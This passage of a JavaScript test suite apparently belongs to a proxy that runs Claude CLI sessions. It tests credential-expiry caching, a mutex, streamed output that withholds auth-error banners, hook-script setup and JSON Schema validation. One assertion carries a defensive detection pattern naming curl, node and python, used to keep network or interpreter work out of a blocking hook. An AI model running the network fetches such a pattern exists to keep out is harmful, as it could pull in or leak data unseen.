test("isLoopbackBind: '100.64.0.1' → false (Tailscale IP)", () => {
  assert.equal(isLoopbackBind("100.64.0.1"), false);
});

// ── Spawn-auth primitives (F3 / F5 / F6, lib/spawn-auth.mjs) ──
// Pure, dependency-injected primitives extracted from server.mjs so the spawn-token concurrency /
// caching / expiry logic is testable without booting the server or mocking execFileSync/spawn.
console.log("\nSpawn-auth (F3 mutex / F5 TTL cache + label memo / F6 expiry gate):");

// F5: expiry gate — the load-bearing invariant that lets a short-TTL keychain cache stay safe.
test("isTokenExpiring: creds within 5-min buffer → true", () => {
  assert.equal(isTokenExpiring({ expiresAt: 1000 }, 1000 - 300000, 300000), true); // exactly at buffer edge
  assert.equal(isTokenExpiring({ expiresAt: 1000 }, 900, 300000), true);           // past the edge
});
test("isTokenExpiring: creds well beyond buffer → false", () => {
  assert.equal(isTokenExpiring({ expiresAt: 10_000_000 }, 0, 300000), false);
});
test("isTokenExpiring: no expiresAt (long-lived env token) → never expiring", () => {
  assert.equal(isTokenExpiring({ accessToken: "x" }, Date.now(), 300000), false);
  assert.equal(isTokenExpiring(null, Date.now(), 300000), false);
});

// F5: last-good label ordering — one exec instead of two on the steady-state keychain path.
test("orderLabelsLastGoodFirst: last-good label is tried first", () => {
  const labels = ["A", "B"];
  assert.deepEqual(orderLabelsLastGoodFirst(labels, "B"), ["B", "A"]);
});
test("orderLabelsLastGoodFirst: null/unknown last-good → original order, fresh array", () => {
  const labels = ["A", "B"];
  assert.deepEqual(orderLabelsLastGoodFirst(labels, null), ["A", "B"]);
  assert.deepEqual(orderLabelsLastGoodFirst(labels, "Z"), ["A", "B"]);
  assert.notEqual(orderLabelsLastGoodFirst(labels, null), labels); // does not mutate/alias input
});

// F5: TTL cache — bounds how often we RE-READ the keychain (not how often we re-decide expiry).
test("createTtlCache: serves cached value within TTL, re-produces after TTL", () => {
  const cache = createTtlCache({ ttlMs: 30000 });
  let calls = 0;
  const produce = () => { calls++; return `v${calls}`; };
  assert.equal(cache.get(produce, 0), "v1");
  assert.equal(cache.get(produce, 10000), "v1"); // within TTL → cached, producer NOT called
  assert.equal(calls, 1);
  assert.equal(cache.get(produce, 40000), "v2"); // past TTL → re-produced
  assert.equal(calls, 2);
});
test("createTtlCache: caches a null miss (absent source not re-probed within TTL)", () => {
  const cache = createTtlCache({ ttlMs: 30000 });
  let calls = 0;
  const produce = () => { calls++; return null; };
  assert.equal(cache.get(produce, 0), null);
  assert.equal(cache.get(produce, 5000), null);
  assert.equal(calls, 1); // the null was cached, not re-probed
});

// F5 core safety property: a short-TTL cache CANNOT reintroduce the #146 forever-stale bug because
// the expiry gate is applied to the CACHED creds on every use. The cache keeps returning the same
// creds object, but isTokenExpiring flips to true the moment the clock crosses the expiry buffer.
test("TTL cache respects expiry gate: cached creds still rejected once clock passes expiry", () => {
  const cache = createTtlCache({ ttlMs: 30000 });
  const creds = { accessToken: "tok", expiresAt: 1_000_000 };
  // t=980_000: cached AND not yet within the 5-min (300_000) buffer → usable.
  const c1 = cache.get(() => creds, 980_000 - 300_000 - 1);
  assert.equal(isTokenExpiring(c1, 980_000 - 300_000 - 1, 300000), false);
  // t=800_000 later: SAME cached object returned (within TTL of the second read window), but now
  // within the expiry buffer → gate rejects it → caller falls back to real HOME. No forever-stale.
  const c2 = cache.get(() => creds, 990_000);
  assert.equal(c2, c1, "cache returns the same creds object");
  assert.equal(isTokenExpiring(c2, 990_000, 300000), true, "expiry gate still fires on cached creds");
});

// ── Async: F3 real-HOME fallback serialization mutex ──
async function runAsyncTests() {
  await testAsync("createSerialMutex: second waiter blocks until first holder releases", async () => {
    const mutex = createSerialMutex();
    const order = [];
    const rel1 = await mutex.acquire();
    order.push("h1-enter");
    let secondEntered = false;
    const p2 = mutex.acquire().then((rel2) => { secondEntered = true; order.push("h2-enter"); return rel2; });
    await new Promise((r) => setTimeout(r, 15));
    assert.equal(secondEntered, false, "second waiter must NOT enter while first holds the mutex");
    order.push("h1-release");
    rel1();
    const rel2 = await p2;
    assert.equal(secondEntered, true, "second waiter enters only after release");
    rel2();
    assert.deepEqual(order, ["h1-enter", "h1-release", "h2-enter"]);
  });

  await testAsync("createSerialMutex: N acquires run strictly in FIFO order, never overlapping", async () => {
    const mutex = createSerialMutex();
    const events = [];
    let active = 0;
    async function critical(id) {
      const rel = await mutex.acquire();
      active++;
      assert.equal(active, 1, `only one holder at a time (id=${id})`);
      events.push(`start${id}`);
      await new Promise((r) => setTimeout(r, 5));
      events.push(`end${id}`);
      active--;
      rel();
    }
    await Promise.all([critical(1), critical(2), critical(3)]);
    assert.deepEqual(events, ["start1", "end1", "start2", "end2", "start3", "end3"]);
  });

  await testAsync("createSerialMutex: release() is idempotent (double-release does not double-admit)", async () => {
    const mutex = createSerialMutex();
    const rel1 = await mutex.acquire();
    rel1();
    rel1(); // second call must be a no-op
    const rel2 = await mutex.acquire(); // should acquire cleanly, exactly once
    let thirdEntered = false;
    const p3 = mutex.acquire().then((r) => { thirdEntered = true; return r; });
    await new Promise((r) => setTimeout(r, 15));
    assert.equal(thirdEntered, false, "double-release must not have leaked an extra admit slot");
    rel2();
    (await p3)();
  });
}

// ── TUI real streaming: MessageDisplay hook sink (backlog #2) ───────────────
// Pure-logic coverage for lib/tui/stream.mjs: sink parsing, the concat===T assertion,
// prefix-stability, the auth-banner holdback, message scoping, and the error paths.
import { TuiDeltaAssembler, parseDeltaChunk, buildStreamSettings, streamFilePath, HOOK_SCRIPT, prepareStreamHook, resolveStreamHoldback, DEFAULT_HOLDBACK_CHARS } from "./lib/tui/stream.mjs";

test("stream: parseDeltaChunk consumes only COMPLETE lines (a torn write stays unread)", () => {
  const p = (i, d, final = false) => JSON.stringify({ hook_event_name: "MessageDisplay", session_id: "s", message_id: "m", index: i, final, delta: d });
  // second payload is mid-write — no trailing newline yet
  const partial = `${p(0, "## A\n\n")}\n${p(1, "body").slice(0, 20)}`;
  const r1 = parseDeltaChunk(partial, 0);
  assert.equal(r1.deltas.length, 1, "only the terminated line is consumed");
  assert.equal(r1.consumed, 1);
  // now it lands complete
  const whole = `${p(0, "## A\n\n")}\n${p(1, "body")}\n`;
  const r2 = parseDeltaChunk(whole, r1.consumed);
  assert.equal(r2.deltas.length, 1, "the once-partial line is picked up exactly once");
  assert.equal(r2.deltas[0].delta, "body");
  assert.equal(r2.consumed, 2);
  // idempotent: nothing new
  assert.equal(parseDeltaChunk(whole, r2.consumed).deltas.length, 0);
});

test("stream: parseDeltaChunk skips blank/garbage lines and foreign hook events", () => {
  const md = JSON.stringify({ hook_event_name: "MessageDisplay", message_id: "m", index: 0, final: true, delta: "ok" });
  const other = JSON.stringify({ hook_event_name: "Stop", message_id: "m", delta: "nope" });
  const text = `\n{not json\n${other}\n${md}\n`;
  const { deltas } = parseDeltaChunk(text, 0);
  assert.equal(deltas.length, 1);
  assert.equal(deltas[0].delta, "ok");
});

// The live-verified contract (claude 2.1.207): deltas are the raw markdown source and
// concat(deltas) === extractLatestAssistantText(transcript), byte-exactly.
const mdFire = (i, delta, { final = false, mid = "m1" } = {}) =>
  ({ hook_event_name: "MessageDisplay", session_id: "s1", message_id: mid, index: i, final, delta });

test("stream: concat(deltas) === T → exact, no top-up, prefix-stable at every n", () => {
  const chunks = ["## Mutex\n\n", "A **mutual exclusion lock** prevents concurrent access.\n\n", "```javascript\nconst m = new Mutex();\n```"];
  const T = chunks.join("");
  const a = new TuiDeltaAssembler({ holdbackChars: 10 });
  let acc = "";
  chunks.forEach((c, i) => {
    const out = a.push(mdFire(i, c, { final: i === chunks.length - 1 }));
    if (out) acc += out;
    assert.ok(T.startsWith(a.full), `prefix-stable at n=${i}`);
  });
  const rec = a.finalize(T);
  assert.equal(rec.ok, true);
  assert.equal(rec.exact, true, "concat(deltas) === T");
  assert.equal(acc + rec.tail, T, "client's assembled stream === T");
  assert.equal(a.deltas, 3);
});

test("stream: holdback withholds the first chars so the auth-banner gate can still fire", () => {
  const banner = "Please run /login · API Error: 401 Invalid authentication credentials"; // 69 chars, a real one
  const a = new TuiDeltaAssembler(); // default holdback 100
  const out = a.push(mdFire(0, banner, { final: true }));
  assert.equal(out, null, "a banner-length message must NEVER reach the client");
  assert.equal(a.emitted, "", "nothing emitted");
  // and the whole-message detector still classifies it — the gate runs on T, before any flush
  assert.ok(detectTuiUpstreamError(a.full) !== null, "banner still detected at terminal");
});

test("stream: holdback releases once past the detector's reach, and only then", () => {
  const a = new TuiDeltaAssembler({ holdbackChars: 100 });
  assert.equal(a.push(mdFire(0, "x".repeat(80))), null, "80 chars: still held");
  const out = a.push(mdFire(1, "y".repeat(40)));
  assert.equal(out, "x".repeat(80) + "y".repeat(40), "released as one chunk once >100");
  assert.equal(a.push(mdFire(2, "tail")), "tail", "subsequent deltas stream straight through");
});

// ── resolveStreamHoldback: the FLOOR under OCP_TUI_STREAM_HOLDBACK (A1 fix) ────────────
// The C-1 auth-banner guarantee holds only while the holdback >= the default detector's
// 100-char reach. These tests pin that the resolver CLAMPS UP to the floor. They are
// mutation-proof: delete the `parsed < floor` branch and the sub-floor cases below fail
// (a 50 would pass straight through, reopening the leak). The clamped flag drives the boot
// warning in server.mjs, so its truthiness is asserted alongside every value.
test("holdback: a sub-floor value is clamped UP to the floor and flagged", () => {
  assert.deepEqual(resolveStreamHoldback("50"), { value: DEFAULT_HOLDBACK_CHARS, clamped: true });
  assert.deepEqual(resolveStreamHoldback("0"), { value: DEFAULT_HOLDBACK_CHARS, clamped: true });
  assert.deepEqual(resolveStreamHoldback("-5"), { value: DEFAULT_HOLDBACK_CHARS, clamped: true });
  assert.deepEqual(resolveStreamHoldback("99"), { value: DEFAULT_HOLDBACK_CHARS, clamped: true });
});

test("holdback: garbage / NaN falls back to the floor and is flagged (not silently 0)", () => {
  assert.deepEqual(resolveStreamHoldback("unlimited"), { value: DEFAULT_HOLDBACK_CHARS, clamped: true });
  assert.deepEqual(resolveStreamHoldback("5MB"), { value: DEFAULT_HOLDBACK_CHARS, clamped: true });
});

test("holdback: an above-floor value passes through unchanged and is NOT flagged", () => {
  assert.deepEqual(resolveStreamHoldback("200"), { value: 200, clamped: false });
  assert.deepEqual(resolveStreamHoldback("101"), { value: 101, clamped: false });
  assert.deepEqual(resolveStreamHoldback(String(DEFAULT_HOLDBACK_CHARS)), { value: DEFAULT_HOLDBACK_CHARS, clamped: false });
});

test("holdback: an unset env var takes the floor WITHOUT flagging (no spurious boot warning)", () => {
  assert.deepEqual(resolveStreamHoldback(undefined), { value: DEFAULT_HOLDBACK_CHARS, clamped: false });
  assert.deepEqual(resolveStreamHoldback(null), { value: DEFAULT_HOLDBACK_CHARS, clamped: false });
  assert.deepEqual(resolveStreamHoldback(""), { value: DEFAULT_HOLDBACK_CHARS, clamped: false });
  assert.deepEqual(resolveStreamHoldback("   "), { value: DEFAULT_HOLDBACK_CHARS, clamped: false });
});

test("holdback: the floor is a parameter, so a deployment can raise (never lower) it", () => {
  assert.deepEqual(resolveStreamHoldback("150", 200), { value: 200, clamped: true }, "custom floor still clamps up");
  assert.deepEqual(resolveStreamHoldback("300", 200), { value: 300, clamped: false });
});

test("stream: a short answer never passes the holdback and is delivered whole at terminal", () => {
  const T = "The capital of France is Paris.";
  const a = new TuiDeltaAssembler();
  assert.equal(a.push(mdFire(0, T, { final: true })), null);
  const rec = a.finalize(T);
  assert.equal(rec.ok, true);
  assert.equal(rec.exact, true);
  assert.equal(rec.tail, T, "the whole short answer is flushed at terminal (buffered semantics)");
});

test("stream: a DROPPED delta is a safe prefix → top-up from the transcript, exact=false", () => {
  const a = new TuiDeltaAssembler({ holdbackChars: 5 });
  a.push(mdFire(0, "Hello world, this is the first block. "));
  const T = "Hello world, this is the first block. And the tail the hook never delivered.";
  const rec = a.finalize(T);
  assert.equal(rec.ok, true, "prefix → recoverable");
  assert.equal(rec.exact, false, "flagged: concat(deltas) !== T");
  assert.equal(rec.tail, "And the tail the hook never delivered.");
  assert.equal(a.emitted + rec.tail, T, "client still receives exactly T");
});

test("stream: emitted bytes NOT a prefix of T → divergence, refuse the turn", () => {
  const a = new TuiDeltaAssembler({ holdbackChars: 5 });
  a.push(mdFire(0, "Let me go and read that file for you first."));
  const rec = a.finalize("A completely different final answer.");
  assert.equal(rec.ok, false, "must NOT serve text the transcript disagrees with");
  assert.equal(rec.tail, null);
});

// Message scoping: the transcript keeps only the LAST assistant message, so the assembler
// must too. Discarding is safe while nothing has been emitted; after that it is a divergence.
test("stream: new message_id BEFORE any emit → held text discarded, stays exact vs T", () => {
  const a = new TuiDeltaAssembler({ holdbackChars: 100 });
  a.push(mdFire(0, "I'll check the file.", { mid: "m1" })); // short pre-tool prose, held back
  assert.equal(a.emitted, "");
  const answer = "The file defines a Mutex class with acquire and release, and " + "z".repeat(90);
  const out = a.push(mdFire(0, answer, { mid: "m2", final: true }));
  assert.equal(out, answer, "only the FINAL message's text is emitted");
  const rec = a.finalize(answer); // T = extractLatestAssistantText = the last message only
  assert.equal(rec.ok, true);
  assert.equal(rec.exact, true, "scoping to the last message_id keeps concat === T true");
  assert.equal(a.messages, 2);
});

test("stream: new message_id AFTER an emit → unretractable, flagged and refused", () => {
  const a = new TuiDeltaAssembler({ holdbackChars: 10 });
  a.push(mdFire(0, "Long pre-tool prose that already went out to the client.", { mid: "m1" }));
  assert.notEqual(a.emitted, "");
  // Assert what push() RETURNS, not merely that finalize() refuses. This test used to check
  // only restartedAfterEmit + finalize().ok, which left it passing while F1 was live: the
  // second message's bytes were still being handed to the client. "The turn is refused" and
  // "the client got the bytes anyway" were both true at once.
  const out = a.push(mdFire(0, "The real answer.", { mid: "m2", final: true }));
  assert.equal(out, null, "after a message boundary follows an emit, NOTHING more may be emitted");
  assert.equal(a.restartedAfterEmit, true);
  assert.equal(a.finalize("The real answer.").ok, false, "must refuse: prose already emitted is not in T");
});

test("F1: an auth banner rendered as a LATER message is never forwarded to the client", () => {
  // The leak this class exists to prevent, in the shape production actually runs
  // (OCP_TUI_FULL_TOOLS=1 → multi-message tool-using turns are the norm):
  //   1. the model narrates past the holdback before a tool call  → released, emitted != ""
  //   2. credentials expire mid-turn → claude renders the 401 as ordinary assistant TEXT,
  //      as a NEW message
  //   3. pre-fix: push() took the `if (this.released)` branch — `released` was never reset at
  //      a message boundary — and returned the BANNER verbatim, straight to the client.
  // The holdback protected only the FIRST message of a turn. This asserts it protects the rest.
  const a = new TuiDeltaAssembler({ holdbackChars: 100 });
  const narration = "I'll check that file for you and then report back with what I find inside it.";
  a.push(mdFire(0, narration + narration, { mid: "m1" }));   // > holdback → released
  assert.notEqual(a.emitted, "", "precondition: the narration really did reach the client");

  const BANNER = "Please run /login · API Error: 401 Invalid authentication credentials";
  const out = a.push(mdFire(1, BANNER, { mid: "m2", final: true }));
  assert.equal(out, null, "the auth banner must NOT be forwarded once a later message begins");
  assert.ok(!a.emitted.includes("401"), "no byte of the banner may have reached the client");
  assert.equal(a.finalize(BANNER).ok, false, "and the turn is refused, not served");
});

test("F1: a first payload with message_id:null cannot disarm the guard", () => {
  // The residual bypass the reviewer found by probing. `this.messageId` used to be initialized
  // to null, so a first payload carrying message_id:null compared EQUAL to it → no boundary
  // registered → `messages` stayed 0 → when the REAL boundary arrived, `messages > 1` evaluated
  // 1 > 1 === false → restartedAfterEmit never armed → the released branch forwarded the banner.
  // The whole F1 guard was disarmed by a single null field. parseDeltaChunk does not validate
  // message_id, so such a payload does reach push().
  const a = new TuiDeltaAssembler({ holdbackChars: 100 });
  const narration = "I'll check that file for you and then report back with what I find inside it.";
  a.push({ hook_event_name: "MessageDisplay", message_id: null, delta: narration + narration });
  assert.notEqual(a.emitted, "", "precondition: the narration released to the client");
  assert.equal(a.messages, 1, "a null message_id is still a MESSAGE — it must register as one");

  const BANNER = "Please run /login · API Error: 401 Invalid authentication credentials";
  const out = a.push({ hook_event_name: "MessageDisplay", message_id: "m2", delta: BANNER });
  assert.equal(out, null, "the banner must not be forwarded — the guard must arm regardless");
  assert.equal(a.restartedAfterEmit, true);
  assert.ok(!a.emitted.includes("401"));
});

test("F1: whitespace cannot buy a release — the holdback screens TRIMMED length", () => {
  // detectTuiUpstreamError() TRIMS before applying its <=100-char rule, so gating release on
  // the UNTRIMMED pending.length let 101 spaces trim to "" → the detector has nothing to
  // classify → returns null → release fires having screened nothing, and every subsequent
  // delta of that message (a banner included) streams unfiltered.
  const a = new TuiDeltaAssembler({ holdbackChars: 100 });
  assert.equal(a.push(mdFire(0, " ".repeat(101), { mid: "m1" })), null,
    "101 chars of whitespace must not clear a 100-char holdback");
  assert.equal(a.released, false, "…and must not flip the assembler into released state");
  const BANNER = "Please run /login · API Error: 401 Invalid authentication credentials";
  assert.equal(a.push(mdFire(1, BANNER, { mid: "m1" })), null, "so the banner stays held back");
  assert.ok(!a.emitted.includes("401"));
});

test("F3: a STALE or truncated hook script is overwritten, not trusted because it exists", () => {
  // ~/.ocp-tui/stream/{md-hook.sh,settings.json} persist across OCP restarts. The old
  // write-if-missing guard meant a host that booted once under an older version was stuck on
  // that version's HOOK_SCRIPT forever — no upgrade could reach it. Worse, a non-atomic write
  // interrupted mid-flight leaves a TRUNCATED md-hook.sh that existsSync() calls fine, and
  // claude BLOCKS on that hook synchronously on every fire.
  const dir = mkdtemp2(`${tmpdir2()}/ocp-hook-`);
  mkdir2(dir, { recursive: true });
  writeFile2(`${dir}/md-hook.sh`, "#!/bin/sh\n# stale, truncated leftov", { mode: 0o700 });
  writeFile2(`${dir}/settings.json`, "{ TRUNCATED", { mode: 0o600 });

  const settings = prepareStreamHook(dir);

  assert.equal(readFile2(`${dir}/md-hook.sh`, "utf8"), HOOK_SCRIPT,
    "the stale script must be replaced with the current one, not left because it existed");
  assert.deepEqual(JSON.parse(readFile2(settings, "utf8")), buildStreamSettings(`${dir}/md-hook.sh`),
    "…and so must the stale settings file");
});

test("stream: hook script is a write-and-exit sh script and tolerates a missing sink var", () => {
  // forceSyncExecution: claude BLOCKS on this hook, so it must do no work inline.
  assert.ok(HOOK_SCRIPT.startsWith("#!/bin/sh"));
  assert.ok(HOOK_SCRIPT.includes('[ -n "$OCP_TUI_STREAM_FILE" ] || exec cat >/dev/null'),
    "no sink configured => swallow stdin and exit 0; never fail, never block claude");
  assert.ok(!/curl|node |python/.test(HOOK_SCRIPT), "no interpreter/network work in a blocking hook");
});

test("stream: settings registers exactly one MessageDisplay command hook (static, no per-request data)", () => {
  const s = buildStreamSettings("/x/md-hook.sh");
  assert.deepEqual(Object.keys(s.hooks), ["MessageDisplay"]);
  assert.equal(s.hooks.MessageDisplay[0].hooks[0].type, "command");
  assert.equal(s.hooks.MessageDisplay[0].hooks[0].command, "/x/md-hook.sh");
  // Warm-pool compatibility: the settings file must NOT carry a session/request-specific path.
  assert.ok(!JSON.stringify(s).includes(".jsonl"), "sink path comes from the pane env, not the settings file");
});

test("stream: sink path is keyed by session_id (concurrent panes cannot interleave)", () => {
  // OCP_TUI_MAX_CONCURRENT defaults to 2 — two claude panes DO run at once. A shared sink
  // would splice request A's deltas into request B's stream.
  const A = streamFilePath("/d", "aaaa-1111");
  const B = streamFilePath("/d", "bbbb-2222");
  assert.notEqual(A, B, "one sink per session-id");
  assert.ok(A.endsWith("/aaaa-1111.jsonl"));
});

test("stream: buildTuiCmd — streaming ON adds env + --settings and drops --safe-mode (hook survives)", () => {
  const off = buildTuiCmd("/bin/claude", "m", "SID", "/h", "cli");
  assert.ok(!off.includes("--settings"), "no --settings when streaming is off");
  assert.ok(!off.includes("OCP_TUI_STREAM_FILE"), "no sink env when streaming is off");
  assert.ok(off.includes("--safe-mode"), "the non-streaming pane carries --safe-mode");
  const on = buildTuiCmd("/bin/claude", "m", "SID", "/h", "cli", { file: "/d/SID.jsonl", settings: "/d/s.json" });
  assert.ok(on.includes("OCP_TUI_STREAM_FILE='/d/SID.jsonl'"), "sink delivered via the pane env");
  assert.ok(on.includes("--settings '/d/s.json'"));
  // --safe-mode would disable the MessageDisplay hook registered by --settings, so the
  // streaming pane must NOT carry it (it keeps the env-var suppression instead).
  assert.ok(!on.includes("--safe-mode"), "streaming pane omits --safe-mode so the hook fires");
  // must not regress the MCP wall or the pinned effort (#156)
  assert.ok(on.includes("--strict-mcp-config") && on.includes("--disallowedTools 'mcp__*'"), "MCP wall intact");
  assert.ok(on.includes("--effort low"), "OCP_TUI_EFFORT default intact");
  assert.ok(!on.includes(" -p ") && !on.includes("--bare"), "still a plain interactive TUI spawn");
});

test("stream: /health block is additive and exposes the divergence counter", () => {
  const stats = { lastEntrypoint: "cli", entrypointMismatches: 0, streamTurns: 3, streamDeltas: 21, streamTopUps: 1, streamDivergences: 0 };
  const sem = { inflight: 0, queued: 0 };
  const b = buildTuiHealthBlock({ enabled: true, entrypointMode: "cli", maxConcurrent: 2, streamEnabled: true }, stats, sem);
  assert.equal(b.streamEnabled, true);
  assert.equal(b.streamTurns, 3);
  assert.equal(b.streamDivergences, 0);
  // existing fields unchanged (grandfathered /health consumers)
  assert.equal(b.enabled, true);
  assert.equal(b.entrypointMode, "cli");
  assert.equal(b.maxConcurrent, 2);
  // a pre-streaming tuiStats (no stream* keys) must not produce undefined/NaN
  const legacy = buildTuiHealthBlock({ enabled: false, entrypointMode: "cli", maxConcurrent: 2 }, { lastEntrypoint: null, entrypointMismatches: 0 }, sem);
  assert.equal(legacy.streamEnabled, false);
  assert.equal(legacy.streamDivergences, 0);
});

// ── OpenAI Structured Outputs (response_format) — lib/structured-output.mjs ──
import { detectStructuredOutput, validateJsonSchema, validateJsonSchemaSafe, extractJsonPayload, structuredSystemInstruction, StructuredOutputError, resolveMaxAttempts } from "./lib/structured-output.mjs";

test("detectStructuredOutput: json_schema shape", () => {
  const d = detectStructuredOutput({ response_format: { type: "json_schema", json_schema: { name: "x", strict: true, schema: { type: "object" } } } });
  assert.equal(d.mode, "schema"); assert.equal(d.strict, true); assert.deepEqual(d.schema, { type: "object" });
});
test("detectStructuredOutput: json_object shape", () => {
  assert.deepEqual(detectStructuredOutput({ response_format: { type: "json_object" } }), { mode: "json_object" });
});
test("detectStructuredOutput: json_mode:true alias → json_object", () => {
  assert.deepEqual(detectStructuredOutput({ json_mode: true }), { mode: "json_object" });
});
test("detectStructuredOutput: absent → null (non-structured untouched)", () => {
  assert.equal(detectStructuredOutput({ messages: [] }), null);
  assert.equal(detectStructuredOutput({ response_format: "nonsense" }), null);
  assert.equal(detectStructuredOutput({ json_mode: false }), null);
});
test("cacheHash: structured marker isolates JSON requests from the conversational slot", () => {
  const msgs = [{ role: "user", content: "list 3 fruits" }];
  const plain = cacheHash("m", msgs, { keyId: "k" });
  const asJson = cacheHash("m", msgs, { keyId: "k", structured: { mode: "json_object" } });
  const asSchema = cacheHash("m", msgs, { keyId: "k", structured: { mode: "schema", schema: { type: "array" } } });
  assert.notEqual(plain, asJson);      // JSON vs prose never collide
  assert.notEqual(asJson, asSchema);   // different schema → different slot
  assert.equal(plain, cacheHash("m", msgs, { keyId: "k" })); // unchanged for normal requests
});

// ── validateJsonSchemaSafe (#181): deep value must NOT crash the handler ─────
// A recursive schema + a model reply nested ~thousands deep overflows the value-
// depth recursion → RangeError → the handler used to surface a generic 500. The
// safe façade turns it into a validation miss (→ retry → refusal). Mutation-proof:
// replace the wrapper body with a bare `validateJsonSchema(...)` call and the deep
// test throws instead of returning errors.
test("validateJsonSchemaSafe: pathologically deep value → errors, never throws", () => {
  const schema = { $defs: { node: { type: "object", properties: { child: { $ref: "#/$defs/node" } } } }, $ref: "#/$defs/node" };
  let deep = {};
  let cur = deep;
  for (let i = 0; i < 6000; i++) { cur.child = {}; cur = cur.child; } // way past any stack limit
  let out;
  assert.doesNotThrow(() => { out = validateJsonSchemaSafe(deep, schema, "$", true); }, "must not throw a RangeError out to the handler");
  assert.ok(Array.isArray(out) && out.length > 0, "returns a non-empty validation error, so the retry loop yields a refusal not a 500");
});

test("validateJsonSchemaSafe: well-formed value passes through unchanged (byte-identical to the raw validator)", () => {
  const schema = { type: "object", required: ["name", "age"], properties: { name: { type: "string" }, age: { type: "integer" } } };
  assert.deepEqual(validateJsonSchemaSafe({ name: "a", age: 3 }, schema), validateJsonSchema({ name: "a", age: 3 }, schema));
  assert.deepEqual(validateJsonSchemaSafe({ name: "a" }, schema), validateJsonSchema({ name: "a" }, schema)); // error case matches too
});

test("validateJsonSchemaSafe: re-throws a non-RangeError so genuine bugs aren't masked as a validation miss", () => {
  // A schema whose `required` is a non-iterable makes the inner validator throw a TypeError — that's
  // a real bug, not a deep-value overflow, and must surface (not be swallowed as "did not validate").
  assert.throws(() => validateJsonSchemaSafe({ x: 1 }, { type: "object", required: 42 }), (e) => !(e instanceof RangeError));
});

test("validateJsonSchema: valid object passes", () => {
  assert.deepEqual(validateJsonSchema({ name: "a", age: 3 }, { type: "object", required: ["name", "age"], properties: { name: { type: "string" }, age: { type: "integer" } } }), []);
});
test("validateJsonSchema: missing required property flagged", () => {
  assert.ok(validateJsonSchema({ name: "a" }, { type: "object", required: ["name", "age"], properties: {} }).some(e => /age.*required/.test(e)));
});
test("validateJsonSchema: additionalProperties:false rejects extra keys", () => {
  assert.ok(validateJsonSchema({ a: 1, b: 2 }, { type: "object", additionalProperties: false, properties: { a: { type: "integer" } } }).some(e => /b.*additional/.test(e)));
});
test("validateJsonSchema: enum rejects non-null value not in list", () => {
  assert.ok(validateJsonSchema("maybe", { type: "string", enum: ["yes", "no"] }).length > 0);
});
test("validateJsonSchema: NULLABLE enum accepts null even when null not in enum (HA regression)", () => {
  // type:["string","null"] + enum:["Loxone"] — a null value must be accepted (nullability > enum).
  assert.deepEqual(validateJsonSchema(null, { type: ["string", "null"], enum: ["Loxone"] }), []);
});
test("validateJsonSchema: nullable enum still enforces non-null values against the enum", () => {
  assert.ok(validateJsonSchema("Other", { type: ["string", "null"], enum: ["Loxone"] }).length > 0);
});
test("validateJsonSchema: type mismatch flagged", () => {
  assert.ok(validateJsonSchema("str", { type: "integer" }).length > 0);
});
test("validateJsonSchema: array items + minItems", () => {
  assert.deepEqual(validateJsonSchema([1, 2, 3], { type: "array", items: { type: "integer" }, minItems: 3 }), []);
  assert.ok(validateJsonSchema([1], { type: "array", items: { type: "integer" }, minItems: 3 }).some(e => /minItems/.test(e)));
});

test("extractJsonPayload: clean JSON", () => {
  const r = extractJsonPayload('{"a":1}'); assert.ok(r.ok); assert.deepEqual(r.value, { a: 1 });
});
test("extractJsonPayload: fenced ```json block", () => {
  const r = extractJsonPayload('```json\n{"a":1}\n```'); assert.ok(r.ok); assert.deepEqual(r.value, { a: 1 });
});
test("extractJsonPayload: prose-wrapped, string-aware balanced slice", () => {
  const r = extractJsonPayload('Sure! Here you go: {"note":"has } and { inside"} — hope that helps.');
  assert.ok(r.ok); assert.deepEqual(r.value, { note: "has } and { inside" });
});
test("extractJsonPayload: array payload", () => {
  const r = extractJsonPayload('[1,2,3]'); assert.ok(r.ok); assert.deepEqual(r.value, [1, 2, 3]);
});
test("extractJsonPayload: no JSON → ok:false", () => {
  assert.equal(extractJsonPayload("I cannot help with that.").ok, false);
});

test("structuredSystemInstruction: embeds schema, forbids fences, escalates on retry", () => {
  const first = structuredSystemInstruction({ mode: "schema", schema: { type: "object" } }, 0, "");
  assert.ok(/code fences/.test(first) && /JSON Schema/.test(first));
  const retry = structuredSystemInstruction({ mode: "schema", schema: { type: "object" } }, 1, "bad enum");
  assert.ok(/REJECTED \(bad enum\)/.test(retry));
});
test("StructuredOutputError carries reason", () => {
  const e = new StructuredOutputError("schema validation failed", "raw");
  assert.equal(e.reason, "schema validation failed"); assert.ok(e instanceof Error);
});

// ── PR #153 review round 2, MUST-FIX: OCP_STRUCTURED_MAX_ATTEMPTS NaN guard must fail closed ──
// The old `Math.max(1, parseInt(env||"3",10))` returned NaN for a non-integer value → the retry loop
// `attempt < NaN` never ran → 0 spawns, every structured request refused. resolveMaxAttempts keeps
// the default instead of silently bricking the feature.
test("resolveMaxAttempts: valid integer honored", () => {
  assert.equal(resolveMaxAttempts("5"), 5);
  assert.equal(resolveMaxAttempts("1"), 1);
});
test("resolveMaxAttempts: unset/empty → default", () => {
  assert.equal(resolveMaxAttempts(undefined), 3);
  assert.equal(resolveMaxAttempts(""), 3);
  assert.equal(resolveMaxAttempts(null), 3);
});
test("resolveMaxAttempts: non-integer / non-finite / <1 fails CLOSED to the default (not NaN, not 0)", () => {
  let warned = 0; const warn = () => { warned++; };
  for (const bad of ["abc", "0", "-1", "NaN", "Infinity", "  "]) {
    const v = resolveMaxAttempts(bad, { fallback: 3, warn });
    assert.equal(v, 3, `bad input ${JSON.stringify(bad)} must fall back to 3, got ${v}`);
    assert.ok(Number.isFinite(v) && v >= 1, "result is always a usable positive integer");
  }
  assert.ok(warned > 0, "invalid values emit a startup warning");
});
test("resolveMaxAttempts: the retry loop is never bounded by NaN (regression: 0 spawns / silent refuse)", () => {
  const attempts = resolveMaxAttempts("abc");
  let ran = 0;
  for (let attempt = 0; attempt < attempts; attempt++) ran++;
  assert.ok(ran >= 1, "loop must execute at least once — pre-fix it ran 0 times");
});

// ── PR #153 review finding 1: $ref/$defs + strict:true must accept conforming objects ──
// The flagship shape the OpenAI SDK emits (zodResponseFormat / client.beta.chat.completions.parse)
// and OpenAI's own structured-outputs docs example: nested {$ref:"#/$defs/step"} + strict:true.
// Before the fix, strict inferred additionalProperties:false on the unresolved $ref (empty props) and
// rejected every real key. This is the exact regression the PR must not ship.
const OPENAI_DOC_SCHEMA = {
  type: "object",
  properties: {
    steps: { type: "array", items: { $ref: "#/$defs/step" } },
    final_answer: { type: "string" },
  },
  $defs: {
    step: {
      type: "object",
      properties: { explanation: { type: "string" }, output: { type: "string" } },
      required: ["explanation", "output"],
      additionalProperties: false,
    },
  },
